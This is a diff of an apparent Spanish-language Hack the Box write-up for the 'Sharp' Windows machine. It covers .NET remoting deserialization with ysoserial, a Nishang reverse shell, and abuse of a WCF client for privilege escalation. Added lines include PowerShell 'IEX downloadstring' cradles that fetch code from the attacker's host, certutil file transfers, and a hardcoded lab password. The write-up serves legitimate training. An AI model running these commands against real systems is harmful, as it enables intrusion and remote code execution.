@@ -5,7 +5,7 @@ description: >-
 title: Hack the Box - Sharp Writeup
 date: 2021-05-1 15:40:00 -0600
 categories: [Hack the Box, Writeup]
-tags: [htb, hacking, hack the box, redteam, windows,ysoserial, hard, writeup, kaban, dnsspy, remoting_service, smb, wcf, smbget, smbmap, smbmapexec]     # TAG names should always be lowercase
+tags: [htb, hacking, hack the box, redteam, windows,ysoserial, hard, writeup, kanban, dnsspy, remoting_service, smb, wcf, smbget, smbmap, smbmapexec]     # TAG names should always be lowercase
 show_image_post: true
 image: /assets/img/Linux/Sharp/01-Sharp-infocard.png
 ---
@@ -232,7 +232,7 @@ Bastante interesante, vemos que se basa en los siguientes CVE: CVE-2014-1806 o C
 Y encontraremos dos repositorios ya con el exploit compilado.
 
 > * [https://github.com/theralfbrown/ExploitRemotingService-binaries](https://github.com/theralfbrown/ExploitRemotingService-binaries)
-> * [https://github.com/theralfbrown/ExploitRemotingService-binaries](https://github.com/theralfbrown/ExploitRemotingService-binaries)
+> * [https://github.com/parteeksingh005/ExploitRemotingService_Compiled](https://github.com/parteeksingh005/ExploitRemotingService_Compiled)
 
 ### RevShell
 
@@ -243,5 +243,86 @@ Para crear nuestro reverse shell, necesitamos tener el siguiente escenario listo
 2. Netcat, en este caso estare utilizando nc64.exe : nc64.exe -nlvp 4444
 3. El reverse shell a utilizar sera el de Nishang, editando el archivo y agregar al final : Invoke-PowerShellTcp -Reverse -IPAddress [Nuestra IP] -Port [Nuestro puerto en escucha]
 4. Dado que la el parametro 'raw' nos permite usar "Send a raw serialized object to the service" :), usaremos Ysoserial de la siguiente manera : ysoserial.exe -f BinaryFormatter -o base64 -g TypeConfuseDelegate -c "powershell -c IEX(new-object net.webclient).downloadstring('http://nuestraIP/Invoke-PowerShellTcp.ps1')"
-5. Nuestro Payload seria de esta forma: ExploitRemotingService.exe -s --user=debug --pass="SharpApplicationDebugUserPassword123!" tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint raw [nuestro payload generado en Ysoserial]
+5. Nuestro request  seria de esta forma: ExploitRemotingService.exe -s --user=debug --pass="SharpApplicationDebugUserPassword123! raw" tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint raw [nuestro payload generado en Ysoserial]
 ```
+Podemos encontrar la ultima version de Ysoserial aqui:
+
+https://github.com/pwntester/ysoserial.net/releases
+> * [https://github.com/pwntester/ysoserial.net/releases](https://github.com/pwntester/ysoserial.net/releases)
+
+El reverse shell de Nishang aqui:
+> * [https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
+
+Generamos nuestro payload con Ysoserial:
+
+![](/assets/img/Linux/Sharp/ysoserial_01.png)
+
+Ponemos a la escucha nuestro servidor web con Python:
+
+![](/assets/img/Linux/Sharp/python_01.png)
+
+Tenemos a netcat a la escucha y ejecutamos el exploit:
+
+![](/assets/img/Linux/Sharp/shell.png)
+
+Y tenemos el flag del User
+
+![](/assets/img/Linux/Sharp/user.png)
+
+### Lars 
+
+En el path `C:\users\lars\Documents>` encontramos lo siguiente:
+
+![](/assets/img/Linux/Sharp/wcf_01.png)
+
+Documentandonos un poco desde:
+
+http://dotnetuy.com/blog/2018/02/14/tutorial-wcf-primera-parte-conceptos-basicos-de-wcf-windows-communication-foundation/
+https://downloads.immunityinc.com/infiltrate2019-slidepacks/christopher-anastasio-abusing-insecure-wcf-endpoints-for-profit-and-fun/abusing_wcf_endpoints.pdf
+
+Dentro de la carpeta `wcf` nos damos cuenta que es un proyecto en visual studio, procedemos a comprimir y guardarlo en la ruta compartida `dev`
+
+![](/assets/img/Linux/Sharp/wcf_02.png)
+
+Ya que estamos en la VM Windows, montamos el path compartido `net use X: \\10.10.10.219\dev` (usando las credenciales de Lars)
+
+### Analizando WCF 
+
+Abriendo el proyecto en Visual Studio, nos llama la atencion este path en espesifico:
+
+![](/assets/img/Linux/Sharp/wcf_03.png)
+
+Asi que basicamente descubrimos el client usa IWcfService para conectarse a los servicios de endpoint de WCF por el puerto `8889`, curiosamente hay unas variables predefinidas que nos son familiar. 
+
+####  Abusando del proyecto WCF
+
+Intentaremos inyectar codigo malicioso en el proyecto que encontramos y compilamos.
+
+Codigo a agregar: `Console.WriteLine(client.InvokePowerShell("IEX (new-object net.webclient).downloadstring('http://nuestraIP/Invoke-PowerShellTcp.ps1')"));`
+
+![](/assets/img/Linux/Sharp/wcf_04.png)
+
+Procedemos a transferir los archivos, simplemente tomamos `WcfClient.exe` y `WcfRemotingLibrary.dll` que se encuentra en el path: `wcf\Client\bin\Debug`
+
+![](/assets/img/Linux/Sharp/wcf_05.png)
+
+Usando Certutil: `certutil -urlcache -split -f http://nuestraIP/archivo`
+
+![](/assets/img/Linux/Sharp/wcf_06.png)
+
+###PrivEsc - Root
+
+Una vez transferimos los archivos, tengamos nuestro servidor web (en mi caso Python), nuestro Netcat en escucha, procedemos a ejecutar nuestro cliente recien transferido.
+
+![](/assets/img/Linux/Sharp/wcf_07.png)
+
+Ahora somos root/administrator :) 
+
+![](/assets/img/Linux/Sharp/root.png)
+
+Solo nos queda hacernos con la flag del root :D
+
+![](/assets/img/Linux/Sharp/g4l1l30.png)
+
+#EOF
+
